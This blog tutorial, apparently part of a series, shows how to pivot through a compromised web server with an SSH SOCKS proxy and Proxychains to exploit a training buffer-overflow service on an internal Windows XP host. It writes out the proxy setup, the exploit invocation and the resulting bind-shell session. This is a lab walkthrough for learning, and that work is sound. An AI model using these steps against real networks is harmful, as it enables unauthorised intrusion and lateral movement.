
This is part 2 of a series of posts on pivoting techniques. In part 1, we used SSH port forwarding to pivot our exploit and obtain remote access to our Windows XP machine. In this article, we'll be performing the same attack, but instead of using SSH local port forwarding, we'll use Proxychains and an SSH SOCKS proxy.

<!--more-->

Proxychains sends connections made by applications through a proxy specified in the proxychains.conf file. By default, it uses Tor's SOCKS port 9050. Proxychains 4 can be downloaded from [https://github.com/haad/proxychains](https://github.com/haad/proxychains).

### The scenario

There are two networks, 192.168.81.0/24 and 192.168.63.0/24. Our attacking machine, and a web server that has access to the 192.168.63.0/24 network are located in the 192.168.81.0/24 network. Our target, a Windows XP SP2 machine, is located in the 192.168.63.0/24. Our attacking machine does not have direct access to it, but the web server does.

![](/images/2012-10-10/01.jpg)

We've already compromised the web server and obtained SSH access to it as the user webmaster. Our goal is to use the web server as our pivot and obtain a remote shell on the Windows XP machine. 

### The exploit

The Windows XP machine runs a vulnerable service called Server-Strcpy on port 10000. Server-Strcpy is part of the [SecurityTube Exploit Research Megaprimer](http://www.securitytube.net/video/1399) series, and can be downloaded at [http://code.securitytube.net/Server-Strcpy.exe](http://code.securitytube.net/Server-Strcpy.exe). I've written a quick exploit for Server-Strcpy.exe that binds a shell on port 4444, and can be downloaded [here](http://techorganic.com/software/serverstrcpy.py).


### The attack

To use Proxychains, we need to connect to the web server via SSH and set it as a SOCKS proxy. This is easily accomplished with the -D option in SSH. This is the command we would run on our machine: 

```
ssh -D 127.0.0.1:8888 webmaster@192.168.81.181
```

We would now have port 8888 listening on our machine, and any connection sent to that port will be proxied over to the web server, and the web server will make the connection on our behalf.
Proxychains 4 allows us to specify a configuration file to use, so we'll create a simple one that basically tells it to use port 8888 on our machine as the proxy: 

```
strict_chain
quiet_mode
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
 
[ProxyList]
socks4  127.0.0.1 8888
```

We'll save this as pivot.conf. We'll use the same exploit as before, which should open a bind shell on port 4444 on our Windows XP machine. Instead of running the exploit directly, we pass it as an argument to Proxychains: 

```
# proxychains4 -f ~/pivot.conf /usr/bin/python exploit.py 192.168.63.142 10000
[proxychains] config file found: /root/pivot.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
[+] sending payload of length 1479
[+] done
#
```

The -f option allows us to tell Proxychains which configuration file we want to use; in this case, pivot.conf. Notice that when we executed exploit.py, we specified the actual IP address of the target, and not 127.0.0.1, like we did in part 1. Proxychains makes it look like the target is directly accessible to us.

Now that the exploit has been executed, we can attempt to connect to the target on port 4444 and obtain our shell. In this case, I'll use ncat 

```
# proxychains4 -f ~/pivot.conf ncat -v 192.168.63.142 4444
[proxychains] config file found: /root/pivot.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.63.142:4444.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
 
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig
 
Windows IP Configuration
 
 
Ethernet adapter Local Area Connection:
 
        Connection-specific DNS Suffix  . : localdomain
        IP Address. . . . . . . . . . . . : 192.168.63.142
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.63.2
 
C:\Documents and Settings\Administrator\Desktop>
```

We've successfully obtained a remote shell on a machine on the internal network by pivoting with Proxychains. So far we've required SSH in order to pivot our attack. In part 3, we'll use ncat's client-to-client and listener-to-listener relays to perform our pivoting; a technique that does not require SSH. 
